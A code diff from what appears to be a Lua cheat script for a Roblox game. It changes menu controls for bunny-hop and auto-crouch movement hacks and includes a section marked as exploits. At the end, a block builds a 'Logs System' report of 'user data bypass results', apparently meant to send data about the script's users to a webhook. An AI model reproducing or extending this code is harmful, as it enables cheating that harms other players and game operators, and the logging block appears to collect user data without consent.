-        DConfiguration.Misc.MovementModification.BHOP.HoldKeybind = Bool
-        
-        if not DConfiguration.Misc.MovementModification.BHOP.HoldKeybind then         
-           spawn(DFunctions.ResetBHOP)
-        end
-   end,
-    })
-
-Tabs.Misc:AddInput("BHOPButtonSize", {
-    Title = "BHOP Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.AutoJump),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.AutoJump = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.AutoJump = 0
-        end
-        
-        DFunctions.UpdateButton("BHOPGui", 0.15 + DConfiguration.Settings.GuiScale.AutoJump, 0.1 + DConfiguration.Settings.GuiScale.AutoJump)
     end
 })
+
+Tabs.Misc:AddKeybind("KeybindBHOP2", {
+    Title = "Hold BHOP",
+    Mode = "Hold", 
+    Default = "Space",
+    Callback = function(State)
+        isHolding = State
+        local isToggled = DConfiguration.Misc.MovementModification.BHOP.Enabled       
+        DConfiguration.Misc.MovementModification.BHOP.Enabled = (isToggled or isHolding)
+        
+        if not State and not isToggled then
+            task.spawn(DFunctions.ResetBHOP)
+        end
+    end
+})
+
 
 local Dropdown = Tabs.Misc:AddDropdown("BHOPVersion", {
         Title = "Select BHOP Version",
@@ -4498,80 +4665,11 @@ Tabs.Misc:AddParagraph({
         Title = " ",
         Content = ""
     })
-    
-local Toggle = Tabs.Misc:AddToggle("AutoCrouch", {Title = "Auto Crouch (Button)", Default = false })
 
-    Toggle:OnChanged(function(State)       
-       if State then
-	         DFunctions.CreateButton("AutoCrouchGui", "Auto Crouch: OFF", 0.15 + DConfiguration.Settings.GuiScale.AutoCrouch, 0.1 + DConfiguration.Settings.GuiScale.AutoCrouch, function(btn)
-	         	DConfiguration.Misc.MovementModification.Crouch.FloatingButton = not DConfiguration.Misc.MovementModification.Crouch.FloatingButton
-	             btn.Text = DConfiguration.Misc.MovementModification.Crouch.FloatingButton and "Auto Crouch: ON" or "Auto Crouch: OFF"
-	             if not DConfiguration.Misc.MovementModification.Crouch.FloatingButton then
-	                LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = false })
-	                wait(0.1)
-	                LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = false })
-	            end
-            end)
-        else
-	      DFunctions.DestroyButton("AutoCrouchGui")
-     end
-end)
-
-local Keybind = Tabs.Misc:AddKeybind("KeybindCrouch", {
-        Title = "Keybind to Auto Crouch (Hold)",
-        Mode = "Hold", 
-        Default = "RightControl",
-        
-        Callback = function(Bool)
-        DConfiguration.Misc.MovementModification.Crouch.Keybind = Bool
-        
-        if not DConfiguration.Misc.MovementModification.Crouch.Keybind then         
-           LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = false })
-	       wait(0.1)
-	       LocalPlayer.PlayerScripts.Events.temporary_events.UseKeybind:Fire({ ["Key"] = "Crouch", ["Down"] = false })
-        end
-   end,
+Tabs.Misc:AddParagraph({
+        Title = "Spam Crouch",
+        Content = "Not work, for PC version Spam Crouch In Soon :)"
     })
-
-Tabs.Misc:AddInput("CrouchButtonSize", {
-    Title = "Auto Crouch Gui Size",
-    Default = tostring(DConfiguration.Settings.GuiScale.AutoCrouch),
-    Placeholder = "0",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        local num = tonumber(Value)
-        if num then
-            DConfiguration.Settings.GuiScale.AutoCrouch = num * 0.01
-        else
-            DConfiguration.Settings.GuiScale.AutoCrouch = 0
-        end
-        
-        DFunctions.UpdateButton("AutoCrouchGui", 0.15 + DConfiguration.Settings.GuiScale.AutoCrouch, 0.1 + DConfiguration.Settings.GuiScale.AutoCrouch)
-    end
-})
-
-local Dropdown = Tabs.Misc:AddDropdown("CrouchType", {
-        Title = "Select Crouch Type",
-        Values = {"Rapid", "Ground", "Air", "Normal"},
-        Multi = false,
-        Default = 1,
-    })
-
-    Dropdown:OnChanged(function(Value)
-        DConfiguration.Misc.MovementModification.Crouch.Type = Value
-    end)
-
-Tabs.Misc:AddInput("CrouchDebounce", {
-    Title = "Crouch Speed",
-    Default = "0.1",
-    Placeholder = "0.1",
-    Numeric = true, 
-    Finished = false, 
-    Callback = function(Value)
-        DConfiguration.Misc.MovementModification.Crouch.debounce = tonumber(Value) or 0.1
-    end
-})
 
 -- Exploits
     
@@ -6982,8 +7080,13 @@ spawn(function()
 			DFunctions.setTFriction(DConfiguration.Misc.PlayerAdjustment.Update.GroundAcceleration)
 			DFunctions.setTJumpAcceleration(DConfiguration.Misc.PlayerAdjustment.Update.JumpAcceleration)
 		end
+		
+		if DConfiguration.Misc.MovementModification.BHOP.Enabled or UserInputService:IsKeyDown(Enum.KeyCode.Space) then
+			DFunctions.BHOPFunction()
+		end
 	end
-end) 
+end)
+
 
 do
     _G.Data = {}
@@ -7014,7 +7117,7 @@ do
         _G.Data.Payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'Overhaul PC Full Intelligence Report',
+                ['title'] = 'Overhaul PC',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
